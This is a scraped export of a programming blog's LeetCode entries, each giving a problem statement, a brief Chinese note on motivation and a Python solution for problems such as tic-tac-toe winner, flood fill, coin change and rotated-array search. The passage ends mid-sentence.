Tic-tac-toe is played by two players A and B on a 3 x 3 grid.\nHere are the rules of Tic-Tac-Toe:\nPlayers take turns placing characters into empty squares ( ).The first player A always places X characters, while the second player B always places O characters.X and O characters are always placed into empty squares, never on filled ones.The game ends when there are 3 of the same (non-empty) character filling any row, column, or diagonal.The game also ends if all squares are non-empty.No more moves can be played if the game is over.Given an array moves where each element is another array of size 2 corresponding to the row and column of the grid where they mark their respective character in the order in which A and B play.\nReturn the winner of the game if it exists (A or B), in case the game ends in a draw return Draw, if there are still movements to play return Pending.\nYou can assume that moves is valid (It follows the rules of Tic-Tac-Toe), the grid is initially empty and A will play first.\nExample 1:\nInput: moves = [[0,0],[2,0],[1,1],[2,1],[2,2]]Output: AExplanation: A wins, he always plays first.X X X X X -\u003e -\u003e X -\u003e X -\u003e X O O OO OOXExample 2:\nInput: moves = [[0,0],[1,1],[0,1],[0,2],[1,0],[2,0]]Output: BExplanation: B wins.X X XX XXO XXO XXO -\u003e O -\u003e O -\u003e O -\u003e XO -\u003e XO O Example 3:\nInput: moves = [[0,0],[1,1],[2,0],[1,0],[1,2],[2,1],[0,1],[0,2],[2,2]]Output: DrawExplanation: The game ends in a draw since there are no moves to make.XXOOOXXOXExample 4:\nInput: moves = [[0,0],[1,1]]Output: PendingExplanation: The game has not finished yet.X O Constraints:\n1 \u003c= moves.length \u003c= 9moves[i].length == 20 \u003c= moves[i][j] \u003c= 2There are no repeated elements on moves.moves follow the rules of tic tac toe. Sol class Solution: def tictactoe(self, moves: List[List[int]]) -\u0026gt; str: def win(c): for who in [\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;]: if c[who] == 3: return who return None tbl = [[None for _ in range(3)] for _ in range(3)] who = True for (i,j) in moves: tbl[i][j] = \u0026#34;A\u0026#34; if who else \u0026#34;B\u0026#34; who = not who rows = [Counter(r) for r in tbl] cols = [Counter([tbl[i][j] for i in range(3)]) for j in range(3)] cross = [Counter([tbl[0][0], tbl[1][1], tbl[2][2]]), Counter([tbl[2][0], tbl[1][1], tbl[0][2]])] ret = list(filter(lambda x: win(x) is not None, rows+cols+cross)) if ret: return list(ret[0].keys())[0] elif len(moves) == 9: return \u0026#34;Draw\u0026#34; else: return \u0026#34;Pending\u0026#34; ","permalink":"https://littlebees.github.io/2021/07/leetcode-1275-find-winner-on-a-tic-tac-toe-game/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e照著做\u003c/p\u003e","title":"leetcode-1275 - Find Winner on a Tic Tac Toe Game"},{"content":"動機 在相等時不用煩惱該縮哪邊的two sum\nProblem You are given an integer array nums and an integer k.\nIn one operation, you can pick two numbers from the array whose sum equals k and remove them from the array.\nReturn the maximum number of operations you can perform on the array.\nExample 1:\nInput: nums = [1,2,3,4], k = 5Output: 2Explanation: Starting with nums = [1,2,3,4]:- Remove numbers 1 and 4, then nums = [2,3]- Remove numbers 2 and 3, then nums = []There are no more pairs that sum up to 5, hence a total of 2 operations.Example 2:\nInput: nums = [3,1,3,4,3], k = 6Output: 1Explanation: Starting with nums = [3,1,3,4,3]:- Remove the first two 3's, then nums = [1,4,3]There are no more pairs that sum up to 6, hence a total of 1 operation. Constraints:\n1 \u003c= nums.length \u003c= 1051 \u003c= nums[i] \u003c= 1091 \u003c= k \u003c= 109 Sol class Solution: def maxOperations(self, nums: List[int], k: int) -\u0026gt; int: nums.sort() a,b,ret=0,len(nums)-1,0 while a\u0026lt;b: if nums[a]+nums[b] == k: ret,a,b = ret+1, a+1, b-1 elif nums[a]+nums[b] \u0026gt; k: b -= 1 else: a += 1 return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-1679-max-number-of-k-sum-pairs/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e在相等時不用煩惱該縮哪邊的two sum\u003c/p\u003e","title":"leetcode-1679 - Max Number of K-Sum Pairs"},{"content":"動機 很有趣的問題，原來python有可以直接算combination的函數\u0026hellip;\nProblem Given an array nums that represents a permutation of integers from 1 to n. We are going to construct a binary search tree (BST) by inserting the elements of nums in order into an initially empty BST. Find the number of different ways to reorder nums so that the constructed BST is identical to that formed from the original array nums.\nFor example, given nums = [2,1,3], we will have 2 as the root, 1 as a left child, and 3 as a right child. The array [2,3,1] also yields the same BST but [3,2,1] yields a different BST.\nReturn the number of ways to reorder nums such that the BST formed is identical to the original BST formed from nums.\nSince the answer may be very large, return it modulo 10^9 + 7.\nExample 1:\nInput: nums = [2,1,3]Output: 1Explanation: We can reorder nums to be [2,3,1] which will yield the same BST. There are no other ways to reorder nums which will yield the same BST.Example 2:\nInput: nums = [3,4,5,1,2]Output: 5Explanation: The following 5 arrays will yield the same BST: [3,1,2,4,5][3,1,4,2,5][3,1,4,5,2][3,4,1,2,5][3,4,1,5,2]Example 3:\nInput: nums = [1,2,3]Output: 0Explanation: There are no other orderings of nums that will yield the same BST.Example 4:\nInput: nums = [3,1,2,5,4,6]Output: 19Example 5:\nInput: nums = [9,4,2,1,3,6,5,7,8,14,11,10,12,13,16,15,17,18]Output: 216212978Explanation: The number of ways to reorder nums to get the same BST is 3216212999. Taking this number modulo 10^9 + 7 gives 216212978. Constraints:\n1 \u003c= nums.length \u003c= 10001 \u003c= nums[i] \u003c= nums.lengthAll integers in nums are distinct. Sol 這是BST，所以第一個是root，而比root小的就是在左，其他在右\n所以第一個位置不能動，其他的只要個子樹的相對位置不變就好，所以就是在去掉root的剩下格子中，有多少種安排左(右)子樹的方式再乘上左右子樹的組合數\nclass Solution: def numOfWays(self, nums: List[int]) -\u0026gt; int: def f(nums): if len(nums) \u0026lt;= 1: return 1 else: r = [n for n in nums[1:] if n \u0026gt; nums[0]] l = [n for n in nums[1:] if n \u0026lt; nums[0]] return comb(len(r)+len(l), len(r))*f(l)*f(r) return (f(nums)-1) % (10**9 + 7) ","permalink":"https://littlebees.github.io/2021/07/leetcode-1569-number-of-ways-to-reorder-array-to-get-same-bst/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e很有趣的問題，原來python有可以直接算combination的函數\u0026hellip;\u003c/p\u003e","title":"leetcode-1569 - Number of Ways to Reorder Array to Get Same BST"},{"content":"動機 複習lower bound\nProblem You are a product manager and currently leading a team to develop a new product. Unfortunately, the latest version of your product fails the quality check. Since each version is developed based on the previous version, all the versions after a bad version are also bad.\nSuppose you have n versions [1, 2, ..., n] and you want to find out the first bad one, which causes all the following ones to be bad.\nYou are given an API bool isBadVersion(version) which returns whether version is bad. Implement a function to find the first bad version. You should minimize the number of calls to the API.\nExample 1:\nInput: n = 5, bad = 4Output: 4Explanation:call isBadVersion(3) -\u003e falsecall isBadVersion(5) -\u003e truecall isBadVersion(4) -\u003e trueThen 4 is the first bad version.Example 2:\nInput: n = 1, bad = 1Output: 1 Constraints:\n1 \u003c= bad \u003c= n \u003c= 231 - 1 Sol class Solution: def firstBadVersion(self, n): a,b=1,n+1 while a\u0026lt;b: mid = (a+b)//2 if isBadVersion(mid): b = mid else: a = mid+1 return a ","permalink":"https://littlebees.github.io/2021/07/leetcode-278-first-bad-version/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習lower bound\u003c/p\u003e","title":"leetcode-278 - First Bad Version"},{"content":"動機 原來在py3要用custom cmp是這麼麻煩\nProblem Given n cuboids where the dimensions of the ith cuboid is cuboids[i] = [widthi, lengthi, heighti] (0-indexed). Choose a subset of cuboids and place them on each other.\nYou can place cuboid i on cuboid j if widthi \u003c= widthj and lengthi \u003c= lengthj and heighti \u003c= heightj. You can rearrange any cuboid's dimensions by rotating it to put it on another cuboid.\nReturn the maximum height of the stacked cuboids.\nExample 1:\nInput: cuboids = [[50,45,20],[95,37,53],[45,23,12]]Output: 190Explanation:Cuboid 1 is placed on the bottom with the 53x37 side facing down with height 95.Cuboid 0 is placed next with the 45x20 side facing down with height 50.Cuboid 2 is placed next with the 23x12 side facing down with height 45.The total height is 95 + 50 + 45 = 190.Example 2:\nInput: cuboids = [[38,25,45],[76,35,3]]Output: 76Explanation:You can't place any of the cuboids on the other.We choose cuboid 1 and rotate it so that the 35x3 side is facing down and its height is 76.Example 3:\nInput: cuboids = [[7,11,17],[7,17,11],[11,7,17],[11,17,7],[17,7,11],[17,11,7]]Output: 102Explanation:After rearranging the cuboids, you can see that all cuboids have the same dimension.You can place the 11x7 side down on all cuboids so their heights are 17.The maximum height of stacked cuboids is 6 * 17 = 102. Constraints:\nn == cuboids.length1 \u003c= n \u003c= 1001 \u003c= widthi, lengthi, heighti \u003c= 100 Sol class Solution: def maxHeight(self, cs: List[List[int]]) -\u0026gt; int: def cmp(a,b): if a[2] != b[2]: return a[2]-b[2] else: return a[0]*a[1]-b[0]*b[1] cs = [sorted(c) for c in cs] cs.sort(key=cmp_to_key(cmp),reverse=True) @cache def dp(x): return max([cs[x][2]+dp(j) for j in range(x+1,len(cs)) if all([cs[j][0] \u0026lt;= cs[x][0], cs[j][1] \u0026lt;= cs[x][1]])],default=cs[x][2]) return max([dp(i) for i in range(len(cs))]) ","permalink":"https://littlebees.github.io/2021/07/leetcode-1691-maximum-height-by-stacking-cuboids/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e原來在py3要用custom cmp是這麼麻煩\u003c/p\u003e","title":"leetcode-1691 - Maximum Height by Stacking Cuboids"},{"content":"動機 複習dfs\nProblem An image is represented by an m x n integer grid image where image[i][j] represents the pixel value of the image.\nYou are also given three integers sr, sc, and newColor. You should perform a flood fill on the image starting from the pixel image[sr][sc].\nTo perform a flood fill, consider the starting pixel, plus any pixels connected 4-directionally to the starting pixel of the same color as the starting pixel, plus any pixels connected 4-directionally to those pixels (also with the same color), and so on. Replace the color of all of the aforementioned pixels with newColor.\nReturn the modified image after performing the flood fill.\nExample 1:\nInput: image = [[1,1,1],[1,1,0],[1,0,1]], sr = 1, sc = 1, newColor = 2Output: [[2,2,2],[2,2,0],[2,0,1]]Explanation: From the center of the image with position (sr, sc) = (1, 1) (i.e., the red pixel), all pixels connected by a path of the same color as the starting pixel (i.e., the blue pixels) are colored with the new color.Note the bottom corner is not colored 2, because it is not 4-directionally connected to the starting pixel.Example 2:\nInput: image = [[0,0,0],[0,0,0]], sr = 0, sc = 0, newColor = 2Output: [[2,2,2],[2,2,2]] Constraints:\nm == image.lengthn == image[i].length1 \u003c= m, n \u003c= 500 \u003c= image[i][j], newColor \u003c 2160 \u003c= sr \u003c m0 \u003c= sc \u003c n Sol class Solution: def floodFill(self, image: List[List[int]], sr: int, sc: int, newColor: int) -\u0026gt; List[List[int]]: seen = set() def dfs(i,j,target): if 0 \u0026lt;= i \u0026lt; len(image) and 0 \u0026lt;= j \u0026lt; len(image[i]) and (i,j) not in seen: seen.add((i,j)) if image[i][j] == target: image[i][j] = newColor [dfs(x,y,target) for (x,y) in [(i+1,j),(i,j+1),(i,j-1),(i-1,j)]] dfs(sr,sc,image[sr][sc]) return image ","permalink":"https://littlebees.github.io/2021/07/leetcode-733-flood-fill/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dfs\u003c/p\u003e","title":"leetcode-733 - Flood Fill"},{"content":"動機 就統計阿\nProblem Given an array of characters chars, compress it using the following algorithm:\nBegin with an empty string s. For each group of consecutive repeating characters in chars:\nIf the group's length is 1, append the character to s.Otherwise, append the character followed by the group's length.The compressed string s should not be returned separately, but instead be stored in the input character array chars. Note that group lengths that are 10 or longer will be split into multiple characters in chars.\nAfter you are done modifying the input array, return the new length of the array.\nYou must write an algorithm that uses only constant extra space. Example 1:\nInput: chars = [a,a,b,b,c,c,c]Output: Return 6, and the first 6 characters of the input array should be: [a,2,b,2,c,3]Explanation: The groups are aa, bb, and ccc. This compresses to a2b2c3.Example 2:\nInput: chars = [a]Output: Return 1, and the first character of the input array should be: [a]Explanation: The only group is a, which remains uncompressed since it's a single character.Example 3:\nInput: chars = [a,b,b,b,b,b,b,b,b,b,b,b,b]Output: Return 4, and the first 4 characters of the input array should be: [a,b,1,2].Explanation: The groups are a and bbbbbbbbbbbb. This compresses to ab12.Example 4:\nInput: chars = [a,a,a,b,b,a,a]Output: Return 6, and the first 6 characters of the input array should be: [a,3,b,2,a,2].Explanation: The groups are aaa, bb, and aa. This compresses to a3b2a2. Note that each group is independent even if two groups have the same character. Constraints:\n1 \u003c= chars.length \u003c= 2000chars[i] is a lower-case English letter, upper-case English letter, digit, or symbol. Sol class Solution: def compress(self, chars: List[str]) -\u0026gt; int: def update(i,cnt,c): if i \u0026lt; len(chars) and cnt \u0026gt; 1: chars[i], i = c,i+1 for n in str(int(cnt)): chars[i] = n i += 1 return i elif cnt == 1: chars[i] = c return i+1 else: return i ret = 0 now, cnt = chars[0],1 for c in chars[1:]: if now == c: cnt += 1 else: ret = update(ret,cnt,now) now,cnt = c,1 ret = update(ret,cnt,chars[-1]) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-443-string-compression/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就統計阿\u003c/p\u003e","title":"leetcode-443 - String Compression"},{"content":"動機 linked list是不是與長度,reverse很有緣\nProblem You are given two non-empty linked lists representing two non-negative integers. The most significant digit comes first and each of their nodes contains a single digit. Add the two numbers and return the sum as a linked list.\nYou may assume the two numbers do not contain any leading zero, except the number 0 itself.\nExample 1:\nInput: l1 = [7,2,4,3], l2 = [5,6,4]Output: [7,8,0,7]Example 2:\nInput: l1 = [2,4,3], l2 = [5,6,4]Output: [8,0,7]Example 3:\nInput: l1 = [0], l2 = [0]Output: [0] Constraints:\nThe number of nodes in each linked list is in the range [1, 100].0 \u003c= Node.val \u003c= 9It is guaranteed that the list represents a number that does not have leading zeros. Follow up: Could you solve it without reversing the input lists?\nSol reverse，加完，reverse\n如果不想reverse，要先把兩邊長度的差距求出來，在遞迴時，短得先不要動，直到兩邊等長才一起動\n# from 206 def reverseList(head: ListNode) -\u0026gt; ListNode: if head is None: return None elif head.next is None: return head else: now = head.next prev = head nextNow = head.next last = prev while now: nextNow = nextNow.next now.next = prev prev = now now = nextNow last.next = None return prev # from 2 def addTwoNumbers2(l1: ListNode, l2: ListNode) -\u0026gt; ListNode: def size(l): ret = 0 while l: l = l.next ret += 1 return ret car = 0 # premise: l1.len \u0026gt; l2.len if size(l2) \u0026gt; size(l1): l1, l2 = [l2, l1] ret = l1 prev = l1 while l1: tmp = l1.val + car + (l2.val if l2 else 0) l1.val = tmp % 10 car = tmp // 10 prev = l1 l1 = l1.next if l1 else None l2 = l2.next if l2 else None if car != 0: prev.next = ListNode(car) return ret class Solution: def addTwoNumbers(self, l1: ListNode, l2: ListNode) -\u0026gt; ListNode: return reverseList(addTwoNumbers2(reverseList(l1), reverseList(l2))) ","permalink":"https://littlebees.github.io/2021/07/leetcode-445-add-two-numbers-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003elinked list是不是與長度,reverse很有緣\u003c/p\u003e","title":"leetcode-445 - Add Two Numbers II"},{"content":"動機 這三小\nProblem Given the API rand7() that generates a uniform random integer in the range [1, 7], write a function rand10() that generates a uniform random integer in the range [1, 10]. You can only call the API rand7(), and you shouldn't call any other API. Please do not use a language's built-in random API.\nEach test case will have one internal argument n, the number of times that your implemented function rand10() will be called while testing. Note that this is not an argument passed to rand10().\nFollow up:\nWhat is the expected value for the number of calls to rand7() function?Could you minimize the number of calls to rand7()? Example 1:\nInput: n = 1Output: [2]Example 2:\nInput: n = 2Output: [2,8]Example 3:\nInput: n = 3Output: [3,8,10] Constraints:\n1 \u003c= n \u003c= 105 Sol 為了讓機率平均，所以把1~49的組合對到1~10\n但後面9個會多，所以要把後面9個擋掉\nclass Solution: def rand10(self): def get(): i,j = rand7(), rand7() cnt = (i-1)*7+j ret = cnt%10 return [ret if ret != 0 else 10, cnt \u0026lt; 41] ret, good = get() while not good: ret, good = get() return ret 另一個是看奇偶\nint rand10(void) { int a, b; do a = rand7(); while (a == 7); do b = rand7(); while (b \u0026gt; 5); return a \u0026amp; 1 ? b : b + 5; } ","permalink":"https://littlebees.github.io/2021/07/leetcode-470-implement-rand10-using-rand7/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這三小\u003c/p\u003e","title":"leetcode-470 - Implement Rand10() Using Rand7()"},{"content":"動機 水題\nProblem Given a pattern and a string s, find if s follows the same pattern.\nHere follow means a full match, such that there is a bijection between a letter in pattern and a non-empty word in s.\nExample 1:\nInput: pattern = abba, s = dog cat cat dogOutput: trueExample 2:\nInput: pattern = abba, s = dog cat cat fishOutput: falseExample 3:\nInput: pattern = aaaa, s = dog cat cat dogOutput: falseExample 4:\nInput: pattern = abba, s = dog dog dog dogOutput: false Constraints:\n1 \u003c= pattern.length \u003c= 300pattern contains only lower-case English letters.1 \u003c= s.length \u003c= 3000s contains only lower-case English letters and spaces ' '.s does not contain any leading or trailing spaces.All the words in s are separated by a single space. Sol class Solution: def wordPattern(self, s, t): t = t.split() if len(s) != len(t): return False tbl = {} for i in range(len(s)): if s[i] in tbl.keys() and t[i] in tbl.values(): if tbl[s[i]] != t[i]: return False elif s[i] in tbl.keys() or t[i] in tbl.values(): return False else: tbl[s[i]] = t[i] return True ","permalink":"https://littlebees.github.io/2021/07/leetcode-290-word-pattern/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e水題\u003c/p\u003e","title":"leetcode-290 - Word Pattern"},{"content":"動機 python有shuffle\nProblem Given an integer array nums, design an algorithm to randomly shuffle the array. All permutations of the array should be equally likely as a result of the shuffling.\nImplement the Solution class:\nSolution(int[] nums) Initializes the object with the integer array nums.int[] reset() Resets the array to its original configuration and returns it.int[] shuffle() Returns a random shuffling of the array. Example 1:\nInput[Solution, shuffle, reset, shuffle][[[1, 2, 3]], [], [], []]Output[null, [3, 1, 2], [1, 2, 3], [1, 3, 2]]ExplanationSolution solution = new Solution([1, 2, 3]);solution.shuffle(); // Shuffle the array [1,2,3] and return its result. // Any permutation of [1,2,3] must be equally likely to be returned. // Example: return [3, 1, 2]solution.reset(); // Resets the array back to its original configuration [1,2,3]. Return [1, 2, 3]solution.shuffle(); // Returns the random shuffling of array [1,2,3]. Example: return [1, 3, 2] Constraints:\n1 \u003c= nums.length \u003c= 200-106 \u003c= nums[i] \u003c= 106All the elements of nums are unique.At most 5 * 104 calls in total will be made to reset and shuffle. Sol class Solution: def __init__(self, nums: List[int]): self.origin = nums self.shu = [x for x in nums] def reset(self) -\u0026gt; List[int]: \u0026#34;\u0026#34;\u0026#34; Resets the array to its original configuration and return it. \u0026#34;\u0026#34;\u0026#34; return self.origin def shuffle(self) -\u0026gt; List[int]: \u0026#34;\u0026#34;\u0026#34; Returns a random shuffling of the array. \u0026#34;\u0026#34;\u0026#34; shuffle(self.shu) return self.shu 沒shuffle的話\nclass Solution: def __init__(self, nums): self.array = nums self.original = list(nums) def reset(self): self.array = self.original self.original = list(self.original) return self.array def shuffle(self): for i in range(len(self.array)): swap_idx = random.randrange(i, len(self.array)) self.array[i], self.array[swap_idx] = self.array[swap_idx], self.array[i] return self.array ","permalink":"https://littlebees.github.io/2021/07/leetcode-384-shuffle-an-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003epython有shuffle\u003c/p\u003e","title":"leetcode-384 - Shuffle an Array"},{"content":"動機 solution總是會有有趣的解法，rotate之後的string一定是原string相接中的substring\nProblem Given two strings s and goal, return true if and only if s can become goal after some number of shifts on s.\nA shift on s consists of moving the leftmost character of s to the rightmost position.\nFor example, if s = abcde, then it will be bcdea after one shift. Example 1:\nInput: s = abcde, goal = cdeabOutput: trueExample 2:\nInput: s = abcde, goal = abcedOutput: false Constraints:\n1 \u003c= s.length, goal.length \u003c= 100s and goal consist of lowercase English letters. Sol 其實string長度不長，所以可以直接比\nclass Solution: def rotateString(self, s: str, goal: str) -\u0026gt; bool: for k in range(len(s)): if s[k:]+s[:k] == goal: return True return False 這邊要提一下有趣的解法\nclass Solution(object): def rotateString(self, A, B): return len(A) == len(B) and B in A+A ","permalink":"https://littlebees.github.io/2021/07/leetcode-796-rotate-string/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003esolution總是會有有趣的解法，rotate之後的string一定是原string相接中的substring\u003c/p\u003e","title":"leetcode-796 - Rotate String"},{"content":"動機 複習fib\nProblem The Tribonacci sequence Tn is defined as follows: T0 = 0, T1 = 1, T2 = 1, and Tn+3 = Tn + Tn+1 + Tn+2 for n \u003e= 0.\nGiven n, return the value of Tn.\nExample 1:\nInput: n = 4Output: 4Explanation:T_3 = 0 + 1 + 1 = 2T_4 = 1 + 1 + 2 = 4Example 2:\nInput: n = 25Output: 1389537 Constraints:\n0 \u003c= n \u003c= 37The answer is guaranteed to fit within a 32-bit integer, ie. answer \u003c= 2^31 - 1. Sol class Solution: @cache def tribonacci(self, n: int) -\u0026gt; int: if n == 0: return 0 elif n in [1,2]: return 1 else: return self.tribonacci(n-3)+self.tribonacci(n-2)+self.tribonacci(n-1) ","permalink":"https://littlebees.github.io/2021/07/leetcode-1137-n-th-tribonacci-number/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習fib\u003c/p\u003e","title":"leetcode-1137 - N-th Tribonacci Number"},{"content":"動機 複習dp\nProblem You are given an integer array coins representing coins of different denominations and an integer amount representing a total amount of money.\nReturn the number of combinations that make up that amount. If that amount of money cannot be made up by any combination of the coins, return 0.\nYou may assume that you have an infinite number of each kind of coin.\nThe answer is guaranteed to fit into a signed 32-bit integer.\nExample 1:\nInput: amount = 5, coins = [1,2,5]Output: 4Explanation: there are four ways to make up the amount:5=55=2+2+15=2+1+1+15=1+1+1+1+1Example 2:\nInput: amount = 3, coins = [2]Output: 0Explanation: the amount of 3 cannot be made up just with coins of 2.Example 3:\nInput: amount = 10, coins = [10]Output: 1 Constraints:\n1 \u003c= coins.length \u003c= 3001 \u003c= coins[i] \u003c= 5000All the values of coins are unique.0 \u003c= amount \u003c= 5000 Sol class Solution: def change(self, amount: int, coins: List[int]) -\u0026gt; int: @cache def dp(acc,i): if acc == amount: return 1 elif acc \u0026gt; amount or i \u0026lt; 0: return 0 else: return sum([dp(acc+coins[i],i), dp(acc,i-1)]) return dp(0,len(coins)-1) ","permalink":"https://littlebees.github.io/2021/07/leetcode-518-coin-change-2/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dp\u003c/p\u003e","title":"leetcode-518 - Coin Change 2"},{"content":"動機 很經典，但沒想過可以用兩個stack\nProblem Implement a first in first out (FIFO) queue using only two stacks. The implemented queue should support all the functions of a normal queue (push, peek, pop, and empty).\nImplement the MyQueue class:\nvoid push(int x) Pushes element x to the back of the queue.int pop() Removes the element from the front of the queue and returns it.int peek() Returns the element at the front of the queue.boolean empty() Returns true if the queue is empty, false otherwise.Notes:\nYou must use only standard operations of a stack, which means only push to top, peek/pop from top, size, and is empty operations are valid.Depending on your language, the stack may not be supported natively. You may simulate a stack using a list or deque (double-ended queue) as long as you use only a stack's standard operations.Follow-up: Can you implement the queue such that each operation is amortized O(1) time complexity? In other words, performing n operations will take overall O(n) time even if one of those operations may take longer.\nExample 1:\nInput[MyQueue, push, push, peek, pop, empty][[], [1], [2], [], [], []]Output[null, null, null, 1, 1, false]ExplanationMyQueue myQueue = new MyQueue();myQueue.push(1); // queue is: [1]myQueue.push(2); // queue is: [1, 2] (leftmost is front of the queue)myQueue.peek(); // return 1myQueue.pop(); // return 1, queue is [2]myQueue.empty(); // return false Constraints:\n1 \u003c= x \u003c= 9At most 100 calls will be made to push, pop, peek, and empty.All the calls to pop and peek are valid. Sol 這裡是用一個stack去跑\n用兩個stack就是一個負責pop的入，一個負責top的read，當需要pop時pop得stack是空的，就從另外一邊搬\nclass MyQueue: def __init__(self): \u0026#34;\u0026#34;\u0026#34; Initialize your data structure here. \u0026#34;\u0026#34;\u0026#34; self.stk = [] def push(self, x: int) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34; Push element x to the back of queue. \u0026#34;\u0026#34;\u0026#34; self.stk.append(x) def pop(self) -\u0026gt; int: \u0026#34;\u0026#34;\u0026#34; Removes the element from in front of queue and returns that element. \u0026#34;\u0026#34;\u0026#34; tmpS = [] while len(self.stk) \u0026gt; 1: tmpS.append(self.stk.pop()) ret = self.stk.pop() while tmpS: self.stk.append(tmpS.pop()) return ret def peek(self) -\u0026gt; int: \u0026#34;\u0026#34;\u0026#34; Get the front element. \u0026#34;\u0026#34;\u0026#34; tmpS = [] while len(self.stk) \u0026gt; 1: tmpS.append(self.stk.pop()) ret = self.stk.pop() tmpS.append(ret) while tmpS: self.stk.append(tmpS.pop()) return ret def empty(self) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34; Returns whether the queue is empty. \u0026#34;\u0026#34;\u0026#34; return not self.stk ","permalink":"https://littlebees.github.io/2021/07/leetcode-232-implement-queue-using-stacks/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e很經典，但沒想過可以用兩個stack\u003c/p\u003e","title":"leetcode-232 - Implement Queue using Stacks"},{"content":"動機 46的follow-up\nProblem Given a collection of numbers, nums, that might contain duplicates, return all possible unique permutations in any order.\nExample 1:\nInput: nums = [1,1,2]Output:[[1,1,2], [1,2,1], [2,1,1]]Example 2:\nInput: nums = [1,2,3]Output: [[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]] Constraints:\n1 \u003c= nums.length \u003c= 8-10 \u003c= nums[i] \u003c= 10 Sol 在同一層不要展開已經展開過的數字\nclass Solution: def permuteUnique(self, nums: List[int]) -\u0026gt; List[List[int]]: def dfs(nums,acc): if not nums: return [acc] else: seen,ret = set(), [] for k in range(len(nums)): if nums[k] not in seen: seen.add(nums[k]) ret += dfs(nums[:k]+nums[k+1:],acc+[nums[k]]) return ret return dfs(nums,[]) ","permalink":"https://littlebees.github.io/2021/07/leetcode-47-permutations-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"/2021/07/leetcode-46\"\u003e46\u003c/a\u003e的follow-up\u003c/p\u003e","title":"leetcode-47 - Permutations II"},{"content":"動機 直接往後塞\nProblem Given the head of a linked list and a value x, partition it such that all nodes less than x come before nodes greater than or equal to x.\nYou should preserve the original relative order of the nodes in each of the two partitions.\nExample 1:\nInput: head = [1,4,3,2,5,2], x = 3Output: [1,2,2,4,3,5]Example 2:\nInput: head = [2,1], x = 2Output: [1,2] Constraints:\nThe number of nodes in the list is in the range [0, 200].-100 \u003c= Node.val \u003c= 100-200 \u003c= x \u003c= 200 Sol class Solution: def partition(self, head: ListNode, x: int) -\u0026gt; ListNode: ret = head end = head prev = None acc = 1 if not head: return head while end.next: end = end.next acc += 1 for i in range(0,acc): if head.val \u0026gt;= x: end.next = head head = head.next end = end.next end.next = None if prev: prev.next = head else: ret = head else: prev = head head = head.next return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-86-partition-list/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e直接往後塞\u003c/p\u003e","title":"leetcode-86 - Partition List"},{"content":"動機 這題是33的follow-up 如果多了重複怎麼辦?\nProblem There is an integer array nums sorted in non-decreasing order (not necessarily with distinct values).\nBefore being passed to your function, nums is rotated at an unknown pivot index k (0 \u003c= k \u003c nums.length) such that the resulting array is [nums[k], nums[k+1], ..., nums[n-1], nums[0], nums[1], ..., nums[k-1]] (0-indexed). For example, [0,1,2,4,4,4,5,6,6,7] might be rotated at pivot index 5 and become [4,5,6,6,7,0,1,2,4,4].\nGiven the array nums after the rotation and an integer target, return true if target is in nums, or false if it is not in nums.\nYou must decrease the overall operation steps as much as possible.\nExample 1:\nInput: nums = [2,5,6,0,0,1,2], target = 0Output: trueExample 2:\nInput: nums = [2,5,6,0,0,1,2], target = 3Output: false Constraints:\n1 \u003c= nums.length \u003c= 5000-104 \u003c= nums[i] \u003c= 104nums is guaranteed to be rotated at some pivot.-104 \u003c= target \u003c= 104 Follow up: This problem is similar to Search in Rotated Sorted Array, but nums may contain duplicates. Would this affect the runtime complexity? How and why?\nSol 遇到重複就把重複的去掉就好，把與中點重複的去掉就好\ndef f(ns,n,l,r): #print(l,r) if abs(r-l) \u0026lt;= 1: return ns[l] == n or ns[r] == n else: mid = (l+r)//2 if n == ns[mid]: return True elif ns[l] \u0026lt; ns[mid]: if ns[l] \u0026lt;= n and n \u0026lt;= ns[mid]: return f(ns,n,l,mid) else: return f(ns,n,mid+1,r) elif ns[mid] \u0026lt; ns[r]: if n \u0026gt;= ns[mid] and n \u0026lt;= ns[r]: return f(ns,n,mid,r) else: return f(ns,n,l,mid-1) elif ns[l] == ns[mid]: return f(ns,n,l+1,r) else: return f(ns,n,l,r-1) class Solution: def search(self, nums: List[int], target: int) -\u0026gt; int: if not nums: return False return f(nums,target,0,len(nums)-1) ","permalink":"https://littlebees.github.io/2021/07/leetcode-81-search-in-rotated-sorted-array-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這題是\u003ca href=\"/2021/07/leetcode-33\"\u003e33\u003c/a\u003e的follow-up\n如果多了重複怎麼辦?\u003c/p\u003e","title":"leetcode-81 - Search in Rotated Sorted Array II"},{"content":"動機 多回傳值的dfs\nProblem Given a binary tree, determine if it is height-balanced.\nFor this problem, a height-balanced binary tree is defined as:\na binary tree in which the left and right subtrees of every node differ in height by no more than 